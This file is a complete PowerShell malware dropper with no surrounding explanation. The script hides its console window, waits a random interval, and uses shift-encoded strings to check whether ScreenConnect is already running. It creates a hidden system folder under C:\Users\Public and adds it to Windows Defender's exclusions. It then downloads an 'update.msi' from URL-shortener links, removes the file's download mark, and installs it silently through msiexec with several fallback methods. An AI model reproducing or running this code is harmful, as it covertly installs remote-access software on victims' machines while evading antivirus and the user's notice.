$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'
$WarningPreference = 'SilentlyContinue'

function Obfuscate {
    param([string]$str)
    $result = ""
    foreach($char in $str.ToCharArray()) {
        $result += [char]([int]$char + 2)
    }
    return $result
}

function Deobfuscate {
    param([string]$str)
    $result = ""
    foreach($char in $str.ToCharArray()) {
        $result += [char]([int]$char - 2)
    }
    return $result
}

function HideWindow {
    try {
        $code = @"
using System;
using System.Runtime.InteropServices;
public class Window {
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
}
"@
        Add-Type -TypeDefinition $code -Language CSharp
        [Window]::ShowWindow([Window]::GetConsoleWindow(), 0) | Out-Null
    } catch {}
}

function IsScreenConnectRunning {
    $patterns = @(
        (Deobfuscate "uetggpeqppgev"),
        (Deobfuscate "eqppgevykug0eqpvtqn"),
        (Deobfuscate "h85c:4hhch;h;5f3")
    )
    
    $found = 0
    
    try {
        $processes = Get-Process
        foreach ($proc in $processes) {
            foreach ($pattern in $patterns) {
                if ($proc.Name -like "*$pattern*" -or $proc.Path -like "*$pattern*") {
                    $found++
                    break
                }
            }
        }
    } catch {}
    
    try {
        $services = Get-Service
        foreach ($svc in $services) {
            foreach ($pattern in $patterns) {
                if ($svc.Name -like "*$pattern*" -or $svc.DisplayName -like "*$pattern*") {
                    $found++
                    break
                }
            }
        }
    } catch {}
    
    try {
        $ports = @(8040, 8041)
        $connections = Get-NetTCPConnection -State Established
        foreach ($conn in $connections) {
            if ($conn.RemotePort -in $ports -or $conn.LocalPort -in $ports) {
                $found++
                break
            }
        }
    } catch {}
    
    return ($found -ge 2)
}

function DownloadFile {
    param($url, $destination)
    
    try {
        $client = New-Object System.Net.WebClient
        $client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
        $client.DownloadFile($url, $destination)
        if (Test-Path $destination) { return $true }
    } catch {}
    
    try {
        Invoke-WebRequest -Uri $url -OutFile $destination -UseBasicParsing
        if (Test-Path $destination) { return $true }
    } catch {}
    
    try {
        Start-BitsTransfer -Source $url -Destination $destination
        if (Test-Path $destination) { return $true }
    } catch {}
    
    return $false
}

function UnblockFile {
    param($filePath)
    
    try { Remove-Item -Path "$filePath`:Zone.Identifier" -Force } catch {}
    try { Unblock-File -Path $filePath } catch {}
    try { cmd /c "echo.>""$filePath`:Zone.Identifier""" } catch {}
}

try {
    HideWindow
    
    Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 30)
    
    if (IsScreenConnectRunning) { exit }
    
    $publicPath = "C:\Users\Public"
    $folderName = "System" + (Get-Random -Minimum 1000 -Maximum 9999)
    $folderPath = Join-Path $publicPath $folderName
    
    try {
        if (!(Test-Path $folderPath)) {
            New-Item -Path $folderPath -ItemType Directory -Force | Out-Null
        }
        
        $folder = Get-Item -Path $folderPath -Force
        $folder.Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
    } catch {
        $folderPath = [System.IO.Path]::GetTempPath()
    }
    
    try {
        Add-MpPreference -ExclusionPath $folderPath -Force
    } catch {}
    
    $msiPath = Join-Path $folderPath "update.msi"
    $urls = @(
        "https://tinyurl.com/sysmsidp",
        "https://tinyurl.com/sysmsi1",
        "https://bit.ly/sosmsid",
        "https://bit.ly/sysmsl"
    )
    
    $downloaded = $false
    foreach ($url in $urls) {
        if (DownloadFile -url $url -destination $msiPath) {
            $downloaded = $true
            break
        }
        Start-Sleep -Seconds (Get-Random -Minimum 2 -Maximum 5)
    }
    
    if (-not $downloaded) { exit }
    
    UnblockFile -filePath $msiPath
    
    $maxAttempts = 3
    for ($attempt = 1; $attempt -le $maxAttempts; $attempt++) {
        try {
            if ($attempt -eq 1) {
                $process = Start-Process -FilePath "msiexec.exe" -ArgumentList "/i `"$msiPath`" /qn /norestart" -WindowStyle Hidden -PassThru
            }
            elseif ($attempt -eq 2) {
                $psi = New-Object System.Diagnostics.ProcessStartInfo
                $psi.FileName = "msiexec.exe"
                $psi.Arguments = "/i `"$msiPath`" /qn /norestart"
                $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
                $psi.CreateNoWindow = $true
                $process = [System.Diagnostics.Process]::Start($psi)
            }
            else {
                $cmdLine = "start /min msiexec.exe /i `"$msiPath`" /qn /norestart"
                $process = Start-Process -FilePath "cmd.exe" -ArgumentList "/c $cmdLine" -WindowStyle Hidden -PassThru
            }
            
            for ($i = 1; $i -le 6; $i++) {
                Start-Sleep -Seconds 10
                
                if (IsScreenConnectRunning) {
                    [System.GC]::Collect()
                    exit
                }
            }
        } catch {}
        
        if ($attempt -lt $maxAttempts) {
            Start-Sleep -Seconds (Get-Random -Minimum 10 -Maximum 30)
        }
    }
} catch {} finally {
    [System.GC]::Collect()
}